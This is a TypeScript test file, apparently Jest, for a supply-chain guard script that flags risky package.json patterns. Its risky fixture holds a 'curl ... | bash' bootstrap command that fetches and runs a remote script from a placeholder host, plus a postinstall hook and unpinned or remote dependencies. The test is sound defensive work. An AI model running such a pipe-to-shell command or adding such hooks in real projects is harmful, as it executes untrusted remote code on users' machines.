import { execFileSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const repoRoot = path.resolve(__dirname, '../..');
const guardScript = path.join(repoRoot, 'scripts', 'supply-chain-guard.mjs');

function runGuard(cwd: string): { status: 'passed' | 'failed'; findingCount: number; findings: Array<{ rule: string; file: string; detail: string }> } {
  let output = '';
  try {
    output = execFileSync(process.execPath, [guardScript, '--json', '--include-untracked'], {
      cwd,
      encoding: 'utf8',
    });
  } catch (error: unknown) {
    output = String((error as { stdout?: string }).stdout || '');
  }
  return JSON.parse(output);
}

function createFixture(files: Record<string, string>): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'zavorth-supply-chain-'));
  execFileSync('git', ['init'], { cwd: root, stdio: 'ignore' });
  for (const [relativePath, content] of Object.entries(files)) {
    const absolutePath = path.join(root, relativePath);
    fs.mkdirSync(path.dirname(absolutePath), { recursive: true });
    fs.writeFileSync(absolutePath, content, 'utf8');
  }
  return root;
}

describe('supply-chain-guard', () => {
  it('passes deterministic registry package specs without install hooks', () => {
    const fixture = createFixture({
      'package.json': JSON.stringify({
        name: 'safe-fixture',
        scripts: {
          build: 'tsc --noEmit',
        },
        dependencies: {
          zod: '^4.3.6',
        },
      }, null, 2),
    });

    expect(runGuard(fixture)).toEqual(expect.objectContaining({
      status: 'passed',
      findingCount: 0,
    }));
  });

  it('blocks install hooks, remote specs, and remote script piping', () => {
    const fixture = createFixture({
      'package.json': JSON.stringify({
        name: 'risky-fixture',
        scripts: {
          postinstall: 'node ./setup.js',
          bootstrap: 'curl https://example.invalid/install.sh | bash',
        },
        dependencies: {
          tool: 'git+ssh://example.invalid/repo.git',
          floating: 'latest',
        },
      }, null, 2),
    });

    const result = runGuard(fixture);

    expect(result.status).toBe('failed');
    expect(result.findings.map((finding) => finding.rule)).toEqual(expect.arrayContaining([
      'package-lifecycle-script',
      'remote-script-execution',
      'risky-dependency-spec',
      'unpinned-dependency-spec',
    ]));
  });
});
